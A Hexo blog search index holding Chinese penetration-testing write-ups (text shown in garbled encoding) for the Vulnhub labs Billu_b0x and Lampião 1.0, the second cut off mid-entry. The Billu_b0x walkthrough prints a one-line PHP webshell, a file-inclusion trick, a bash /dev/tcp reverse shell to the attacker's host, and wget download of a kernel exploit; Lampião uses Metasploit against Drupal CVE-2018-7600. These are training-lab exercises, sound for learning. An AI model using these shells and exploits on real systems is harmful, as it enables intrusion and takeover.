<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Billu_b0xæ¸—é€æµ‹è¯•</title>
      <link href="/2023/02/27/Vulnhub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97Billu_b0x%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/02/27/Vulnhub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97Billu_b0x%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhubé¶æœºç³»åˆ—-Billu-b0xæ¸—é€æµ‹è¯•"><a href="#Vulnhubé¶æœºç³»åˆ—-Billu-b0xæ¸—é€æµ‹è¯•" class="headerlink" title="Vulnhubé¶æœºç³»åˆ—:Billu_b0xæ¸—é€æµ‹è¯•"></a>Vulnhubé¶æœºç³»åˆ—:Billu_b0xæ¸—é€æµ‹è¯•</h1><p><strong>ip</strong></p><p>æ‰«æå½“å‰ç½‘æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.237.0/24</span><br></pre></td></tr></table></figure><p><strong>æ‰«æç›®æ ‡ä¸»æœºç«¯å£</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.237.130 -p-</span><br></pre></td></tr></table></figure><p>å¼€æ”¾80,22ç«¯å£</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p><strong>æ‰«æç›®å½•æ•æ„Ÿæ–‡ä»¶</strong></p><h4 id="æ¼æ´ç‚¹ä¸€ï¼ˆsshè¿æ¥ï¼‰"><a href="#æ¼æ´ç‚¹ä¸€ï¼ˆsshè¿æ¥ï¼‰" class="headerlink" title="æ¼æ´ç‚¹ä¸€ï¼ˆsshè¿æ¥ï¼‰"></a>æ¼æ´ç‚¹ä¸€ï¼ˆsshè¿æ¥ï¼‰</h4><p><strong>test.php</strong></p><p>æœ‰ä¸ªfileå‚æ•°ï¼ŒPOSTä¼ å‚å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–</p><p>å°çŸ¥è¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.phpmyä¸€èˆ¬ä½äº/var/www/ ç›®å½•ä¸‹</span><br><span class="line">2.PHPé»˜è®¤é…ç½®æ–‡ä»¶æ˜¯config.inc.php</span><br></pre></td></tr></table></figure><p>ç»“åˆèµ·æ¥ï¼Œç”±äºæ‰«æç›®å½•æ—¶å‘ç°phphmyä¸”22ç«¯å£sshæœåŠ¡å¼€æ”¾ï¼Œæ‰€ä»¥åªéœ€è¦è·å¾—phpMyAdminè´¦æˆ·å¯†ç å³å¯sshè¿æ¥ç™»å½•</p><p>æŸ¥çœ‹phpmyè´¦æˆ·ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/var/www/phpmy/config.inc.php</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppAWA0O"><img src="https://s1.ax1x.com/2023/03/04/ppAWA0O.png" alt="ppAWA0O.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: root</span><br><span class="line">password: roottoor</span><br></pre></td></tr></table></figure><p>sshç™»å½•è·å¾—rootæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.237.130</span><br></pre></td></tr></table></figure><h4 id="æ¼æ´ç‚¹äºŒ"><a href="#æ¼æ´ç‚¹äºŒ" class="headerlink" title="æ¼æ´ç‚¹äºŒ"></a>æ¼æ´ç‚¹äºŒ</h4><p>åŒæ ·åœ¨test.phpå¤„è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œæœ€ç»ˆè¯»åˆ°c.php</p><p>åœ¨é‡Œé¢å‘ç°äº†ç–‘ä¼¼mysqlçš„ç™»å½•è´¦æˆ·å’Œå¯†ç ï¼Œå»&#x2F;phpmy&#x2F;ç™»å½•ï¼Œè¿›å…¥åå°</p><p>åœ¨ica_labåº“ä¸‹çš„authè¡¨ä¸­å‘ç°ä¸€ä¸ªè´¦æˆ·ä»¥åŠå¯†ç ï¼Œå›åˆ°æœ€åˆé¡µé¢è¿›è¡Œä¸€ä¸ªç™»å½•æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">biLLu</span><br><span class="line">hEx_it</span><br></pre></td></tr></table></figure><p>ç™»é™†ä¸Šæ¥åå‘ç°ä¸€ä¸ªpancel.phpèƒ½è¿›è¡Œæ–‡ä»¶ä¸Šä¼ </p><p>å¯ä»¥åœ¨å…ˆè¯»å–ä»–çš„æºç </p><p><strong>pancel.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;c.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;head2.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]!=<span class="literal">true</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to billu b0x &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form method=post style=&quot;margin: 10px 0px 10px 95%;&quot;&gt;&lt;input type=submit name=lg value=Logout&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;lg&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form method=post&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;select name=load&gt;</span></span><br><span class="line"><span class="string">    &lt;option value=&quot;show&quot;&gt;Show Users&lt;/option&gt;</span></span><br><span class="line"><span class="string">&lt;option value=&quot;add&quot;&gt;Add User&lt;/option&gt;</span></span><br><span class="line"><span class="string">&lt;/select&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &amp;nbsp&lt;input type=submit name=continue value=&quot;continue&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;continue&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$dir</span>=<span class="title function_ invoke__">getcwd</span>();</span><br><span class="line"><span class="variable">$choice</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;./&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$choice</span>===<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$choice</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$choice</span>===<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$choice</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$address</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;address&#x27;</span>]);</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$iname</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$r</span>=<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line"><span class="variable">$image</span>=<span class="keyword">array</span>(<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$r</span>,<span class="variable">$image</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$finfo</span> = @<span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME); </span><br><span class="line"><span class="variable">$filetype</span> = @<span class="variable">$finfo</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/image\/jpeg/&#x27;</span>,<span class="variable">$filetype</span> )  || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/image\/png/&#x27;</span>,<span class="variable">$filetype</span> ) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/image\/gif/&#x27;</span>,<span class="variable">$filetype</span> ))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;uploaded_images/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Uploaded successfully &quot;</span>;</span><br><span class="line">  <span class="variable">$update</span>=<span class="string">&#x27;insert into users(name,address,image,id) values(\&#x27;&#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>.<span class="variable">$address</span>.<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>.<span class="variable">$iname</span>.<span class="string">&#x27;\&#x27;, \&#x27;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;\&#x27;)&#x27;</span>; </span><br><span class="line"> <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$update</span>);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;i told you dear, only png,jpg and gif file are allowed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;only png,jpg and gif file are allowed&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸éš¾å‘ç°ï¼Œè¯¥phpåœ¨å¯¹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä»…ä»…æ‰§è¡Œäº†ä¸€ä¸ªç™½åå•çš„é™å®šï¼Œè€Œæ²¡æœ‰æ‰§è¡Œå…¶ä»–ä»»ä½•åˆ¤æ–­åŠè¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œå›¾ç‰‡ğŸä¸Šä¼ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.png/b + 1.php/a 2.png</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸåå›¾ç‰‡å°†ä¼šè¢«ç§»åŠ¨åˆ°&#x2F;uploaded_imagesï¼Œä½†ç°åœ¨è¿˜æ²¡æœ‰ä¸€ä¸ªåŒ…å«å›¾ç‰‡ğŸçš„ä¸€ä¸ªç‚¹</p><p>å®¡è®¡ä»£ç ï¼Œå½“loadå‚æ•°ä¸ºå›¾ç‰‡é©¬çš„ä¸€ä¸ªåœ°å€å°±å¯ä»¥è¿›è¡Œä¸€ä¸ªåŒ…å«ï¼Œä¸”æ²¡æœ‰è¿›è¡Œè¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;continue&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$dir</span>=<span class="title function_ invoke__">getcwd</span>();</span><br><span class="line"><span class="variable">$choice</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;./&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$choice</span>===<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$choice</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$choice</span>===<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$choice</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œå†ä»¤loadå‚æ•°ä¸ºå›¾ç‰‡é©¬çš„åœ°å€ï¼Œå³å¯è¿›è¡ŒåŒ…å«</p><p>å¯ä»¥å‘ç°ï¼ŒæˆåŠŸæ‰§è¡Œäº†æˆ‘ä»¬çš„å‘½ä»¤</p><p>æ‰€ä»¥åå¼¹shellåˆ°kaliä¸Šï¼Œä»¥ä¾¿è¿›è¡Œä¸€ä¸ªææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.237.128/2333 0&gt;&amp;1&quot; | bash</span><br></pre></td></tr></table></figure><p>éœ€è¦æŠŠpayloadurlç¼–ç ä¸€æ¬¡ï¼ŒåŒæ—¶ç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><p>æˆåŠŸåå¼¹ï¼Œæ‹¿åˆ°ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„æƒé™</p><p>æŸ¥çœ‹ç³»ç»Ÿçš„ç‰ˆæœ¬ä¿¡æ¯å’Œå†…æ ¸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>ç”¨kaliè‡ªå¸¦çš„searchsploitæœç´¢è¯¥ç‰ˆæœ¬æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 12.04</span><br></pre></td></tr></table></figure><p>æ˜¯è¿™ä¸ª:<code>linux/local/37292.c</code></p><p>æ‰¾åˆ°exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/exploitdb/exploits/linux/local</span><br><span class="line">cp 37292.c /root</span><br></pre></td></tr></table></figure><p>å¼€å¯ pythonæœåŠ¡</p><p><code>python3 -m http.server 8000 </code></p><p>å› ä¸ºæƒé™ä¸å¤Ÿï¼Œæ‰€ä»¥å»åˆ°&#x2F;tmp&#x2F;ç›®å½•ä¸‹ï¼Œç„¶åç”¨wgetä¸‹è½½expæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.237.128:8000/37292.c</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘.cæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 37292.c -o exp</span><br></pre></td></tr></table></figure><p>ææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure><p>å‡çº§åˆ‡æ¢äº¤äº’å¼shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€é¶æœºæµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LampiÃ£o 1.0æ¸—é€æµ‹è¯•</title>
      <link href="/2023/02/20/Lampi%C3%A3o%201.0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/02/20/Lampi%C3%A3o%201.0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhubé¶æœºç³»åˆ—-Lampiao-1-0æ¸—é€æµ‹è¯•"><a href="#Vulnhubé¶æœºç³»åˆ—-Lampiao-1-0æ¸—é€æµ‹è¯•" class="headerlink" title="Vulnhubé¶æœºç³»åˆ—:LampiÃ£o 1.0æ¸—é€æµ‹è¯•"></a>Vulnhubé¶æœºç³»åˆ—:LampiÃ£o 1.0æ¸—é€æµ‹è¯•</h1><h2 id="æ¶‰åŠçŸ¥è¯†"><a href="#æ¶‰åŠçŸ¥è¯†" class="headerlink" title="æ¶‰åŠçŸ¥è¯†"></a>æ¶‰åŠçŸ¥è¯†</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.CVE-2018-7600</span><br><span class="line">2.dirty cowææƒ</span><br></pre></td></tr></table></figure><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>é¶æœºä¸‹è½½åœ°å€ï¼š<a href="https://www.vulnhub.com/entry/lampiao-1,249/">LampiÃ£o: 1 ~ VulnHub</a>ï¼Œ<a href="https://www.kali.org/get-kali/#kali-virtual-machines">Kali Linux</a></p><p><a href="https://imgse.com/i/ppF64P0"><img src="https://s1.ax1x.com/2023/03/02/ppF64P0.png" alt="ppF64P0.png"></a></p><p>VMwareæ‰“å¼€<code>.ovf</code>æ–‡ä»¶</p><p>æˆåŠŸåº”å¦‚å›¾</p><p><a href="https://imgse.com/i/ppF65GV"><img src="https://s1.ax1x.com/2023/03/02/ppF65GV.png" alt="ppF65GV.png"></a></p><h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><h3 id="è·å–ç›®æ ‡æœºipåŠç«¯å£"><a href="#è·å–ç›®æ ‡æœºipåŠç«¯å£" class="headerlink" title="è·å–ç›®æ ‡æœºipåŠç«¯å£"></a>è·å–ç›®æ ‡æœºipåŠç«¯å£</h3><p><strong>ip</strong></p><p>æ‰«æå½“å‰ç½‘æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.30.0/24</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppF6oxU"><img src="https://s1.ax1x.com/2023/03/02/ppF6oxU.png" alt="ppF6oxU.png"></a></p><p>å…¶ä¸­<code>192.168.30.133</code>å¯ç”¨</p><p><a href="https://imgse.com/i/ppF67MF"><img src="https://s1.ax1x.com/2023/03/02/ppF67MF.png" alt="ppF67MF.png"></a></p><p><strong>æ‰«æç›®æ ‡ä¸»æœºç«¯å£</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.30.133 -p-</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppF6bqJ"><img src="https://s1.ax1x.com/2023/03/02/ppF6bqJ.png" alt="ppF6bqJ.png"></a></p><p>å¼€æ”¾äº†ä¸€ä¸ª1898ç«¯å£</p><p><a href="https://imgse.com/i/ppF6LZ9"><img src="https://s1.ax1x.com/2023/03/02/ppF6LZ9.png" alt="ppF6LZ9.png"></a></p><p><strong>æ‰«æç›®å½•æ•æ„Ÿæ–‡ä»¶</strong></p><p><a href="https://imgse.com/i/ppF6XI1"><img src="https://s1.ax1x.com/2023/03/02/ppF6XI1.png" alt="ppF6XI1.png"></a></p><p>å‘ç°<code>/CHANGELOG.txt</code>æ—¥å¿—æ–‡ä»¶</p><p>åœ¨é‡Œé¢å‘ç°äº†ç½‘ç«™ä½¿ç”¨çš„æ˜¯drupalæ¡†æ¶ï¼ŒåŒæ—¶ç‰ˆæœ¬æ›´æ–°åˆ°äº† 7.54</p><p><a href="https://imgse.com/i/ppF6vPx"><img src="https://s1.ax1x.com/2023/03/02/ppF6vPx.png" alt="ppF6vPx.png"></a></p><p>é‚£ä¹ˆå°±å¥½åŠäº†ï¼Œç›´æ¥æ‰¾Drupal7ç›¸å…³æ¼æ´ï¼Œæ‰¾åˆ°<a href="https://cert.360.cn/report/detail?id=c92cfff2634a44c8b1d6bd5e64c07f3d">Drupalæ ¸å¿ƒè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</a></p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>åˆ©ç”¨msfç›´æ¥æ‰“</p><p><a href="https://imgse.com/i/ppFc9MD"><img src="https://s1.ax1x.com/2023/03/02/ppFc9MD.png" alt="ppFc9MD.png"></a></p><p>optionè®¾ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">set rhost 192.168.30.133</span><br><span class="line">set rport 1898</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppFcFZd"><img 